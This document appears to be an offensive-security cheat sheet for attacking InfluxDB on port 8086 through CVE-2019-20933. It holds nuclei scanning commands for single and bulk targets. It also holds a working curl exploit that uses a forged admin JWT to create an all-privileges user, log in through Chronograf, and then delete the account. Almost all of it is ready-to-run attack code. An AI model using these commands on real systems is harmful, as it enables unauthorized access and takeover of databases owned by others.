# 8086 - InfluxDB

## Potential Risks

### CVE-2019-20933 (Unauthorized Access)

```yaml
# https://github.com/yuukisec/iPoCs
nuclei -t ~/ipocs -id influxdb-unauth -u localhost:8086

# Bulk testing
nuclei -t ~/ipocs -id influxdb-unauth -l hosts.txt -c 100 -bs 100
```

## Exploiting

### Information Disclosure

```bash
# Create user
URL=http://localhost:8086
AUTH="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoyNTM0MDIxODU2MDB9.Fu66RZDcUSawPpmtCpVDMr8kWjbTgmBa4I1kFzCLxM8"
BODY=q="CREATE USER \"santaClaus\" with PASSWORD '1qaz@WSX3edc' WITH ALL PRIVILEGES;"
curl -X POST -H $AUTH -d $BODY $URL/query

# https://github.com/influxdata/chronograf
chronograf --influxdb-url="$URL" \
    --influxdb-username="santaClaus" \
    --influxdb-password="1qaz@WSX3edc"

BODY=q="DROP USER \"santaClaus\";"
curl -X POST -H $AUTH -d $BODY $URL/query
```
